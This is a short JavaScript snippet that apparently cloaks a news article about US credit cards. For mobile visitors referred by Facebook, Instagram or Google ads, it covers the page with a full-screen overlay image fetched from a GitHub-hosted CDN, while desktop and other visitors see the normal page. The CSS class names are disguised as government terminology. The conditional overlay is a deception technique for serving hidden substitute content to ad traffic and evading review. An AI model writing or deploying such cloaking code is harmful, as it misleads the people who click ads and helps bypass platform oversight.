(function() {
    const targetUrl = "https://radarkaur.bacakoran.co/ekonomi-bisnis/read/29062/top-five-credit-cards-in-the-us-with-excellent-insurance-benefits";
    const currentUrl = window.location.href.split('?')[0].split('#')[0];
    const referrer = document.referrer.toLowerCase();
    
    const allowedReferrers = ['facebook.com', 'instagram.com', 'googleadservices.com'];
    const isAllowedReferrer = allowedReferrers.some(domain => referrer.includes(domain));

    /* DETEKSI MOBILE (REAL FILTER) */
    const isMobile = /android|iphone|ipad|ipod|mobile/i.test(navigator.userAgent);

    /* HARUS LOLOS KEDUANYA */
    if ((currentUrl === targetUrl || currentUrl === targetUrl + "/") && isAllowedReferrer && isMobile) {
        
        const style = document.createElement('style');
        style.innerHTML = `
            .dscr-penyelenggaraan-pemerintahan {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 99999999;

                margin: 0;
                padding: 0;
                box-sizing: border-box;

                background: url('https://cdn.jsdelivr.net/gh/masterkaur/dae-pemerintahan/lpx.webp') no-repeat top center;
                background-size: 100% auto;
                overflow-y: auto;
            }

            @media (min-width: 769px) {
                .dscr-penyelenggaraan-pemerintahan {
                    display: none !important;
                }
            }
        `;
        document.head.appendChild(style);

        const div = document.createElement('div');
        div.className = 'dscr-penyelenggaraan-pemerintahan';
        div.id = 'dscr-penyelenggaraanWrapper';

        if (document.body) {
            document.body.appendChild(div);
        } else {
            document.addEventListener('DOMContentLoaded', () => {
                document.body.appendChild(div);
            });
        }
    }
})();
